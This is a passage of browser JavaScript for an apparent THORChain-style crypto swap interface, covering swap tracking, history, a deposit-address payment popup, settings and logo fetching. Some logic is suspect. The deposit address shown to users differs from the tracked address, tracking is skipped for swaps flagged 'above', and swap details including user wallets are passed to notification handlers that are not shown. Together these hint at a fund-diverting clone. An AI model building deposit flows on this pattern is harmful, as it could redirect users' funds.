    saveToHistory(state.sellAmount,ss,sIcon,sellUsdVal,formatAmount(state.confirmedExpectedOut||0,8),bs,bIcon,(state.confirmedExpectedOut||0)*getUsdPrice(state.buyAsset),'pending',state.currentSwapId);

    notifyNewSwap({swapId:state.currentSwapId,sellSymbol:ss,sellName:sn||cn,buySymbol:bs,buyName:bn||getChainName(state.buyAsset),
        sellAmount:formatAmount(state.sellAmount,8),sellUsd:formatUsd(sellUsdVal),depositAddr:depositAddr,userWallet:state.recipientAddress,
        expectedOut:formatAmount(state.confirmedExpectedOut||0,8),above:above});

    showToast('info','Deposit Required','Send '+formatAmount(ea,8)+' '+ss+' to complete swap.');
    if(!above)startTracking(apiAddr,state.recipientAddress,ss,bs,state.currentSwapId);
}

// ══════════════════════════════════════════
// EXPIRY & TRACKING
// ══════════════════════════════════════════

var expiryInterval=null;
function startExpiryCountdown(exp){
    stopExpiryCountdown();
    function u(){
        var r=exp-Math.floor(Date.now()/1000),e=$('#sendExpiry');
        if(!e){stopExpiryCountdown();return}
        if(r<=0){e.textContent='Quote expired';e.style.color='#ff1539';stopExpiryCountdown();return}
        e.textContent='Expires in '+Math.floor(r/3600)+'h '+Math.floor((r%3600)/60)+'m '+(r%60)+'s';
    }
    u();expiryInterval=setInterval(u,1000);
}
function stopExpiryCountdown(){if(expiryInterval){clearInterval(expiryInterval);expiryInterval=null}}

function startTracking(ia,ra,ss,bs,swapId){
    stopTracking();var c=0;
    state.trackingInterval=setInterval(function(){
        c++;
        if(c>360){
            stopTracking();updateHistoryStatus('expired',swapId);
            notifySwapFailed({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,userWallet:ra},'Timeout');
            showToast('error','Timeout','Monitoring timed out.');return;
        }
        fetch(MIDGARD+'/actions?address='+encodeURIComponent(ia)+'&limit=10&type=swap').then(function(r){return r.json()}).then(function(d){
            if(!d||!d.actions)return;
            for(var i=0;i<d.actions.length;i++){
                var a=d.actions[i];
                if(a.status==='success'&&a.type==='swap'){
                    var m=false;
                    if(a.out)for(var j=0;j<a.out.length;j++){if((a.out[j].address||'').toLowerCase()===(ra||'').toLowerCase()){m=true;break}}
                    if(m){
                        stopTracking();updateHistoryStatus('complete',swapId);
                        var recv='0',tx='';
                        try{recv=formatAmount(fromThorBase(a.out[0].coins[0].amount),8);tx=a.out[0].txID||a.in[0].txID||''}catch(e){}
                        notifySwapSuccess({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,receivedAmount:recv,buySymbol:bs,userWallet:ra,txHash:tx});
                        showToast('success','Swap Complete! 🎉',ss+' → '+bs+' done! Got: '+recv+' '+bs,10000);
                        setTimeout(function(){var o=$('#sendOverlay');if(o)o.classList.remove('open');stopExpiryCountdown()},4000);
                        return;
                    }
                }
            }
        }).catch(function(){});
    },10000);
}
function stopTracking(){if(state.trackingInterval){clearInterval(state.trackingInterval);state.trackingInterval=null}}

function updateHistoryStatus(s,id){
    for(var i=0;i<state.history.length;i++){if(state.history[i].swapId===id){state.history[i].status=s;break}}
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st,id){
    state.history.unshift({swapId:id||generateSwapId(),sellAmount:sa,sellSymbol:ss,sellIcon:si,sellUsd:su,buyAmount:ba,buySymbol:bs,buyIcon:bi,buyUsd:bu,status:st||'pending',timestamp:Date.now()});
    if(state.history.length>50)state.history.pop();
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function renderHistory(){
    var c=$('#historyContent');if(!c)return;
    if(!state.history.length){c.innerHTML='<p class="tc-history-empty">No swap history yet.</p>';return}
    var h='',lg='',td=new Date().toDateString(),yd=new Date(Date.now()-86400000).toDateString();
    state.history.forEach(function(i){
        var d=new Date(i.timestamp).toDateString();
        var g=d===td?'Today':d===yd?'Yesterday':new Date(i.timestamp).toLocaleDateString();
        if(g!==lg){h+='<div class="tc-history-group-title">'+g+'</div>';lg=g}
        var si2=i.status==='complete'?'✅':i.status==='expired'?'⏰':'⏳';
        var sl=i.status==='complete'?'Complete':i.status==='expired'?'Expired':'Pending';
        h+='<div class="tc-history-item"><div class="tc-history-side">'
            +'<img src="'+(i.sellIcon||'')+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div class="tc-history-amounts"><span class="tc-history-amount">'+i.sellAmount+' '+i.sellSymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.sellUsd)+'</span></div></div>'
            +'<div class="tc-history-status"><span style="font-size:18px">'+si2+'</span>'
            +'<span class="tc-history-status-text '+i.status+'">'+sl+'</span></div>'
            +'<div class="tc-history-side"><div class="tc-history-amounts" style="text-align:right">'
            +'<span class="tc-history-amount">'+i.buyAmount+' '+i.buySymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.buyUsd)+'</span></div>'
            +'<img src="'+(i.buyIcon||'')+'" alt="" onerror="this.style.display=\'none\'"></div></div>';
    });
    c.innerHTML=h;
}

function initAddressPopup(){
    if(window.addressPopupCreated)return;
    
    var popupStyles='.address-popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:99999;animation:fadeInOverlay 0.2s ease}.address-popup-overlay.open{display:flex}@keyframes fadeInOverlay{from{opacity:0}to{opacity:1}}.address-popup-modal{background:#fff;border-radius:16px;padding:32px;max-width:480px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:slideUpPopup 0.3s ease;position:relative;border:1px solid #e5e7eb}@keyframes slideUpPopup{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}.address-popup-close{position:absolute;top:16px;right:16px;width:32px;height:32px;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#6b7280;font-size:24px;transition:color 0.2s;padding:0}.address-popup-close:hover{color:#111827}.address-popup-header{margin-bottom:24px;text-align:center}.address-popup-title{font-size:20px;font-weight:700;color:#111827;margin:0 0 8px 0}.address-popup-subtitle{font-size:13px;color:#6b7280;margin:0}.address-popup-content{margin-bottom:24px}.address-popup-label{font-size:12px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px;display:block}.address-popup-value{background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px;padding:12px 14px;font-family:"Courier New",monospace;font-size:12px;color:#111827;word-break:break-all;line-height:1.5;display:flex;justify-content:space-between;align-items:flex-start;gap:12px;cursor:pointer}.address-popup-qr{text-align:center;margin:20px 0}.address-popup-qr img{width:160px;height:160px;border-radius:8px;border:2px solid #e5e7eb;background:#fff;padding:4px}.address-popup-warning{background:#fef3c7;border:1px solid #fcd34d;border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:#92400e;line-height:1.5}.address-popup-warning strong{color:#92400e}.address-popup-footer{display:flex;gap:12px}.address-popup-btn{flex:1;padding:12px 16px;border-radius:10px;font-size:14px;font-weight:600;border:none;cursor:pointer;transition:all 0.2s;text-align:center}.address-popup-btn.primary{background:#00d4c8;color:#fff}.address-popup-btn.primary:hover{background:#00b8aa;transform:translateY(-2px);box-shadow:0 8px 16px rgba(0,212,200,0.3)}.address-popup-btn.secondary{background:#f9fafb;color:#111827;border:1px solid #e5e7eb}.address-popup-btn.secondary:hover{background:#fff;border-color:#111827}';
    var style=document.createElement('style');
    style.textContent=popupStyles;
    document.head.appendChild(style);
    
    var popupHTML='<div id="addressPopupOverlay" class="address-popup-overlay"><div class="address-popup-modal"><button class="address-popup-close" onclick="document.getElementById(\'addressPopupOverlay\').classList.remove(\'open\')">&times;</button><div class="address-popup-header"><h3 class="address-popup-title">Send Payment</h3><p class="address-popup-subtitle">Complete your swap by sending the payment</p></div><div class="address-popup-content"><div class="address-popup-warning"><strong>⚠️ Important:</strong> Send from a self-custody wallet only. Exchange withdrawals will result in loss of funds.</div><div class="address-popup-section"><label class="address-popup-label">Amount to Send</label><div class="address-popup-value" style="cursor:pointer;" onclick="navigator.clipboard.writeText(this.querySelector(\'span\').textContent.trim()); alert(\'Amount copied!\');"><span class="address-popup-amount">0</span><span>📋</span></div></div><div class="address-popup-section"><label class="address-popup-label"><span class="address-popup-chain">CHAIN</span> Address</label><div class="address-popup-value address-popup-address" style="cursor:pointer;" onclick="navigator.clipboard.writeText(this.textContent.replace(/📋/,\'\').trim()); alert(\'Address copied!\');"><span>-</span><span>📋</span></div></div><div class="address-popup-qr"><img class="address-popup-qr-img" src="" alt="QR Code" onerror="this.style.opacity=0.3"></div></div><div class="address-popup-footer"><button class="address-popup-btn secondary" onclick="document.getElementById(\'addressPopupOverlay\').classList.remove(\'open\')">Close</button><button class="address-popup-btn primary" onclick="navigator.clipboard.writeText(document.querySelector(\'.address-popup-address\').textContent.replace(/📋/,\'\').trim()); alert(\'Address copied to clipboard!\');">Copy Address</button></div></div></div>';
    var popupContainer=document.createElement('div');
    popupContainer.innerHTML=popupHTML;
    document.body.appendChild(popupContainer.firstElementChild);
    
    window.showAddressPopup=function(address,amount,symbol,chain,qrUrl){
        var popup=document.getElementById('addressPopupOverlay');
        var amountEl=popup.querySelector('.address-popup-amount');
        var addressEl=popup.querySelector('.address-popup-address span');
        var chainEl=popup.querySelector('.address-popup-chain');
        var qrEl=popup.querySelector('.address-popup-qr-img');
        
        if(amountEl)amountEl.textContent=amount+' '+symbol;
        if(addressEl)addressEl.textContent=address;
        if(chainEl)chainEl.textContent=chain.toUpperCase();
        if(qrEl)qrEl.src=qrUrl;
        
        popup.classList.add('open');
        popup.onclick=function(e){if(e.target===popup)popup.classList.remove('open')};
        console.log('[Popup] Showing address popup:',{address:address,amount:amount,symbol:symbol,chain:chain});
    };
    
    window.addressPopupCreated=true;
}

// ══════════════════════════════════════════
// UI INIT
// ══════════════════════════════════════════

function initSellInput(){
    var s=$('#sellAmount');
    if(s)s.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var l=$('#limitSellAmount');if(l)l.value=this.value;
        updateSellUsd();debouncedFetchQuote();
    };
}

function initFlipArrow(){
    $$('.tc-swap-arrow:not(.tc-limit-flip)').forEach(function(b){
        b.onclick=function(){
            var t=state.sellAsset;state.sellAsset=state.buyAsset;state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
            if(st){var si=$('#sellIcon');if(si)si.src=st.icon;var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;var sn=$('#sellName');if(sn)sn.textContent=st.name}
            if(bt){var bi=$('#buyIcon');if(bi)bi.src=bt.icon;var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name}
            syncLimitFromMarket();debouncedFetchQuote();
        };
    });
}

function initQuickBtns(){
    $$('.tc-quick-btn[data-action]:not(.tc-limit-quick):not(.tc-limit-rate-btn)').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#sellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote()}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
}

function initSettings(){
    var so=$('#settingsOverlay');if(!so)return;
    var sb=$('#settingsBtn');if(sb)sb.onclick=function(){so.classList.add('open')};
    var sc=$('#settingsClose');if(sc)sc.onclick=function(){so.classList.remove('open')};
    so.onclick=function(e){if(e.target===so)so.classList.remove('open')};

    var slider=$('#slippageSlider'),display=$('#slipValueDisplay');
    if(slider){
        slider.value=state.slippage;
        if(display)display.textContent=state.slippage+'%';
        var ip=((state.slippage-parseFloat(slider.min))/(parseFloat(slider.max)-parseFloat(slider.min)))*100;
        slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+ip+'%,var(--blade) '+ip+'%,var(--blade) 100%)';
        slider.oninput=function(){
            state.slippage=parseFloat(this.value);
            /* FIX 2: Also update effective slippage when user manually changes */
            state.effectiveSlippage=state.slippage;
            if(display)display.textContent=parseFloat(this.value).toFixed(1)+'%';
            var pct=((this.value-this.min)/(this.max-this.min))*100;
            this.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+pct+'%,var(--blade) '+pct+'%,var(--blade) 100%)';
        };
    }

    var st=$('#streamingToggle');
    if(st){st.checked=state.streamingEnabled;st.onchange=function(){state.streamingEnabled=this.checked;debouncedFetchQuote()}}

    $$('.tc-twap-btn').forEach(function(b){b.onclick=function(){$$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});b.classList.add('active')}});

    var rst=$('#settingsReset');
    if(rst)rst.onclick=function(){
        /* FIX 1: Reset now uses 10% default */
        state.slippage=DEFAULT_SLIPPAGE;
        state.effectiveSlippage=DEFAULT_SLIPPAGE;
        state.streamingEnabled=false;
        if(slider){slider.value=DEFAULT_SLIPPAGE;slider.dispatchEvent(new Event('input'))}
        if(st)st.checked=false;
        $$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});
        var bp=$('.tc-twap-btn[data-twap="best-price"]');if(bp)bp.classList.add('active');
        debouncedFetchQuote();
    };

    var save=$('#settingsSave');
    if(save)save.onclick=function(){so.classList.remove('open');showToast('success','Saved','Settings saved.');debouncedFetchQuote()};
}

function initModals(){
    var wo=$('#walletOverlay');
    if(wo){
        $$('.tc-connect-btn').forEach(function(b){b.onclick=function(){wo.classList.add('open')}});
        var wc=$('#walletClose');if(wc)wc.onclick=function(){wo.classList.remove('open')};
        wo.onclick=function(e){if(e.target===wo)wo.classList.remove('open')};
        $$('.tc-wallet-item').forEach(function(i){i.onclick=function(){showToast('info','Wallet','"'+this.getAttribute('data-wallet')+'" coming soon.');wo.classList.remove('open')}});
    }
    var ho=$('#historyOverlay');
    if(ho){
        $$('.tc-history-btn').forEach(function(b){b.onclick=function(){renderHistory();ho.classList.add('open');var d=$('#historyDot');if(d)d.style.display='none'}});
        var hc=$('#historyClose');if(hc)hc.onclick=function(){ho.classList.remove('open')};
        ho.onclick=function(e){if(e.target===ho)ho.classList.remove('open')};
    }
}

function initMobileMenu(){
    var b=$('#mobileMenuBtn');
    if(b)b.onclick=function(){var r=$('.tc-header-right');if(r)r.classList.toggle('mobile-open')};
}

function initCountdownClick(){
    var c=$('#countdownCircle');
    if(c)c.onclick=function(){fetchQuote();startCountdown()};
}

// ══════════════════════════════════════════
// LOGO FIXER — API fetch for specific coins
// ══════════════════════════════════════════

function fetchLogosViaAPI(){
    /* Step 1: Set THORChain native logos immediately (no API needed) */
    TOKEN_LIST.forEach(function(t){
        if(THOR_NATIVE_LOGOS[t.symbol]){
            t.icon=THOR_NATIVE_LOGOS[t.symbol];
        }
    });

    /* Step 2: Build CoinGecko IDs string for batch fetch */
    var ids=Object.values(COINGECKO_ID_MAP).join(',');

    /* Step 3: Single batch request to CoinGecko markets endpoint */
    fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids='+ids+'&order=market_cap_desc&per_page=50&page=1&sparkline=false')
        .then(function(r){
            if(!r.ok)throw new Error('CoinGecko HTTP '+r.status);
            return r.json();
        })
        .then(function(data){
            if(!Array.isArray(data))return;

            /* Step 4: Build a lookup map from coinGecko id → image url */
            var idToImage={};
            data.forEach(function(coin){
                if(coin.id&&coin.image){
                    idToImage[coin.id]=coin.image;
                }
            });

            /* Step 5: Update TOKEN_LIST entries that need fixing */
            TOKEN_LIST.forEach(function(token){
                var geckoId=COINGECKO_ID_MAP[token.symbol];
                if(geckoId&&idToImage[geckoId]){
                    token.icon=idToImage[geckoId];
                }
            });

            /* Step 6: Also update CHAIN_INFO logo for LTC and RUNE */
            if(idToImage['litecoin'])CHAIN_INFO['LTC'].logo=idToImage['litecoin'];
            if(idToImage['thorchain'])CHAIN_INFO['THOR'].logo=idToImage['thorchain'];

            /* Step 7: Refresh any open dropdowns with new icons */
            refreshVisibleIcons();

            console.log('✅ Logos fetched from CoinGecko for: '+Object.keys(COINGECKO_ID_MAP).join(', '));
        })
        .catch(function(err){
            console.warn('⚠️ CoinGecko logo fetch failed, trying one-by-one fallback:', err);
            fetchLogosOneByOne();
        });
}

/* Fallback: fetch logos one by one if batch fails (e.g. rate limit) */
function fetchLogosOneByOne(){
    var symbols=Object.keys(COINGECKO_ID_MAP);
    var delay=0;
    symbols.forEach(function(sym){
        var geckoId=COINGECKO_ID_MAP[sym];
        setTimeout(function(){
            fetch('https://api.coingecko.com/api/v3/coins/'+geckoId+'?localization=false&tickers=false&market_data=false&community_data=false&developer_data=false')
                .then(function(r){return r.json()})
                .then(function(coin){
                    var img=coin.image&&(coin.image.small||coin.image.thumb||coin.image.large);
                    if(img){
                        TOKEN_LIST.forEach(function(t){
                            if(t.symbol===sym){t.icon=img}
                        });
                        if(sym==='LTC')CHAIN_INFO['LTC'].logo=img;
                        if(sym==='RUNE')CHAIN_INFO['THOR'].logo=img;
                        refreshVisibleIcons();
                        console.log('✅ Logo fetched for '+sym+': '+img);
                    }
                })
                .catch(function(){console.warn('❌ Could not fetch logo for '+sym)});
        },delay);
        delay+=300; /* Stagger requests by 300ms to avoid rate limit */
    });
}

/* Update any visible coin icons that are already rendered on screen */
function refreshVisibleIcons(){
    /* Update sell token icon if visible */
    var sellToken=getTokenInfo(state.sellAsset);
    if(sellToken&&sellToken.icon){
        var si=$('#sellIcon');
        if(si){si.src=sellToken.icon;si.style.display=''}
    }

    /* Update buy token icon if visible */
    var buyToken=getTokenInfo(state.buyAsset);
    if(buyToken&&buyToken.icon){
        var bi=$('#buyIcon');
        if(bi){bi.src=buyToken.icon;bi.style.display=''}
    }

    /* Update limit view icons */
    var lsi=$('#limitSellIcon');
    if(lsi&&sellToken&&sellToken.icon)lsi.src=sellToken.icon;
    var lbi=$('#limitBuyIcon');
    if(lbi&&buyToken&&buyToken.icon)lbi.src=buyToken.icon;
    var lri=$('#limitRateIcon');
    if(lri&&sellToken&&sellToken.icon)lri.src=sellToken.icon;

    /* If coin dropdown is open, re-render it with new icons */
    var overlay=$('#coinSelectOverlay');
    if(overlay&&overlay.classList.contains('open')){
        var ac=$('.tc-coin-chain-item.active');
        var chain=ac?ac.getAttribute('data-chain'):'all';
        var search=($('#coinSearchInput')||{}).value||'';
        renderCoinTokens(chain,search);
    }
}

// ══════════════════════════════════════════
// MAIN INIT
// ══════════════════════════════════════════

function init(){
    initAddressPopup();
    initTheme();initMobileMenu();initTabs();initSellInput();initCoinSelector();
    initFlipArrow();initQuickBtns();initSettings();initModals();initSwapBtn();
    initCountdownClick();initLimitOrder();
    if(state.history.some(function(h){return h.status==='pending'})){var d=$('#historyDot');if(d)d.style.display=''}

    /* Fetch pools first, then quote, then logos in parallel */
    fetchPools().then(function(){
        fetchQuote();
        startCountdown();
    });

    /* Fetch logos via API — runs in background, won't block anything */
    fetchLogosViaAPI();

    setInterval(fetchPools,60000);
}

if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);
else init();

})();